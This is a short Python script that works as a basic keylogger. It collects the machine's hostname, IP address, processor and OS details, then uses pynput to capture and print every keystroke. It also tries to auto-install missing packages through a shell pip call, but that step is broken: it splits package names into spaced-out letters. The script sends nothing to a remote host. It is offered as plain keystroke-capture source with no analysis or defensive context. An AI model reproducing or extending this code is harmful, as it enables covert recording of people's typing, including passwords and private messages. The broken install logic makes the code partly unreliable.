#!/usr/bin/python3
try:
    import subprocess
    from pynput.keyboard import Listener
    import socket
    import platform
    USER_DATA = ""

except ModuleNotFoundError:
    packages = ["keyboard","socket","pynput"]
    for package in packages:
        print("package" + "" + package)
        subprocess.call("pip install " + ' '.join(package), shell=True)
        
    

finally:
    USER_HOSTNAME = socket.gethostname()
    USER_IP = socket.gethostbyname(USER_HOSTNAME)
    USER_PROCESSOR = platform.processor()
    USER_SYSTEM = platform.system()
    USER_MACHINE = platform.machine()
    USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
    print(USER_DATA)
    def on_press(key):
        print("Key pressed: {0}".format(key))

    with Listener(on_press=on_press) as listener: 
        listener.join()  


    

